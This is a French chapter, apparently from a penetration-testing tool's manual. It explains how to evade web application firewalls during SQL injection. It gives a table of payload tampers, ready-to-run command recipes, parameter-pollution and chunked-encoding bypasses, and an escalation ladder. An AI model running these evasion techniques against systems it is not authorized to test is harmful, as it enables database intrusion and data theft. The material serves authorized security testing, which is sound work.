# 04 — Évasion WAF

> Principe : **progressif**. Auto `space2comment` sur blocage actif → 1-2 tampers
> ciblés → chaîne courte → request-tampers. Jamais de `base64encode` en aveugle
> (casse les différentiels boolean) ni de `--skip-urlencode` sans raison.

## 4.1 Diagnostic (avant de tamper)

```bash
injekt --target "https://waf.example.com/?id=1" --profile stealth -v
# Chercher : 403/406 répétés, challenge (JS/cookie/captcha), headers CDN/WAF.
```

| Signal | Interprétation | Action |
|---|---|---|
| 403/406 répétés | Blocage actif → auto `space2comment` déjà tenté | `--tamper space2comment,randomcase` manuel + `--level 2` |
| Challenge JS/cookie | Bot-defense | `--profile stealth` + `--rate-limit 3`, pas de tamper magique |
| 429/503 | Rate-limit/infra | `--ignore-code 429,503` + baisser `--rate-limit/--threads` |
| Reset/timeout ciblés sur payloads | Signature WAF | Rotation espaces/casse/encoding (4.2) |
| Diff nulle partout | Filtrage silencieux ou pas d'injection | `--text-only`, `--fetch-using`, `--hpp`, OOB |

## 4.2 Les 19 tampers (`--tamper a,b,c`)

Sémantique : `original + chaque single + chaîne complète`. Insensible à la casse,
alias sqlmap (`comment→space2comment`, `url→charencode`, `double→doubleurlencode`, `hex→hexencode`).
Inconnus = warning + ignorés. Paires boolean TRUE/FALSE = sets boolean-safe
(`base64encode` exclu là, opt-in pour techniques single-payload).

| Tamper | Transformation | Usage typique |
|---|---|---|
| `space2comment` | ` ` → `/**/` | **Bypass générique ; auto sur blocage actif** |
| `space2plus` | ` ` → `+` | Query-string |
| `space2tab` | ` ` → `%09` | Filtres whitespace |
| `space2newline` | ` ` → `%0a` | Filtres whitespace |
| `space2randomblank` | ` ` → aléatoire `%09 %0a %0c %0d %a0 +` | Rotation de signatures |
| `space2dash` | ` ` → `--<digits>%0A` | MSSQL/SQLite (`--` fin de ligne) |
| `space2mssqlblank` | ` ` → aléatoire `%09 %0A %0B %0C %0D` | **MSSQL** |
| `randomcase` | `SELECT` → `SeLeCt` | Signatures sensibles à la casse |
| `versionedcomment` | `SELECT` → `/*!50000SELECT*/` | **MySQL only** |
| `versionedmorekeywords` | Set élargi → `/*!50000KW*/` | **MySQL**, plus large |
| `betweencomment` | `SELECT` → `S/**/E/**/L…` | Filtres par mots-clés |
| `randomcomments` | 1 split `/**/` aléatoire dans le mot-clé | Moins signature-obvious |
| `equaltolike` | `=` → ` LIKE ` (`>=/<=/!=` gardés) | WAF signant `=` ; auto-ajouté en L3 |
| `charencode` | Percent-encode non-alnum | Filtres d'encoding |
| `doubleurlencode` | `%` → `%25` | WAF à double-décodage |
| `hexencode` | Hex `%xx` par octet | Filtres d'encoding |
| `unicodeencode` | `%uXXXX` par char | Stacks IIS/ASP |
| `overlongutf8` | `/` → `%c0%af` | Décodeurs overlong-UTF8 |
| `base64encode` | Payload entier → Base64 | **Opt-in : opaque, casse boolean** |

```bash
# Recettes :
# 1. Générique (1er essai manuel) :
injekt --target "https://example.com/?id=1" --tamper space2comment,randomcase --techniques boolean,union
# 2. MySQL versioned + encoding :
injekt --target "https://example.com/?id=1" --tamper versionedcomment,charencode --dbms mysql
# 3. MSSQL blanks :
injekt --target "https://example.com/?id=1" --tamper space2mssqlblank,randomcase --dbms mssql
# 4. Signe = filtré (L3 l'ajoute aussi) :
injekt --target "https://example.com/?id=1" --tamper equaltolike,space2comment --level 3
# 5. Double-décodage suspecté :
injekt --target "https://example.com/?id=1" --tamper doubleurlencode,space2comment
```

## 4.3 Request-tampers : `--hpp`, `--chunked`

```bash
# HPP : duplique ?id=1&id=PAYLOAD (Query/Body) — WAF ne voyant que la 1re occurrence :
injekt --target "https://example.com/?id=1" --hpp --techniques boolean
# Chunked : body en Transfer-Encoding: chunked streamé (Body only, bypass Content-Length) :
injekt --target "https://example.com/search" --method POST --data "q=test" --chunked --techniques boolean
# Recon avec les deux :
injekt recon scan --target "example.com" --hpp --chunked --auto-enumerate --dbs
```

L3 de `auto` active `--hpp` automatiquement (voir chap. 7).

## 4.4 Façonnage fin : `--prefix/--suffix`, encoding

```bash
# Fermeture de contexte (après tampers) :
injekt --target "https://example.com/?id=1" --prefix "')" --suffix "-- -" --techniques boolean,error
# Chars exclus du percent-encoding :
injekt --target "https://example.com/?id=1" --safe-chars "()," --techniques union
# Sans URL-encoding (avec prudence — casse proxies/WAF logs) :
injekt --target "https://example.com/?id=1" --skip-urlencode --techniques boolean
```

Ordre réel : **tampers → prefix/suffix → encoding** (`PayloadOpts{prefix,suffix,safe_chars,skip_urlencode,fetch_using}`).

## 4.5 Escalade recommandée (manuelle)

```
L1 + boolean,error (référence)
 → + space2comment,randomcase
 → + charencode OU versionedcomment (si MySQL) OU space2mssqlblank (si MSSQL)
 → --level 2
 → + --hpp
 → --level 3 + equaltolike + --text-only
 → --chunked (si POST Body)
 → OOB (si blind total, chap. 3.6)
 → STOP : documenter l'échec (négatif WAF-hardené ≠ pas d'injection, mais fin de scope rentable)
```

Tracer chaque palier au rapport (tampers/level/request_count) — un contournement
non tracé est un finding non reproductible.
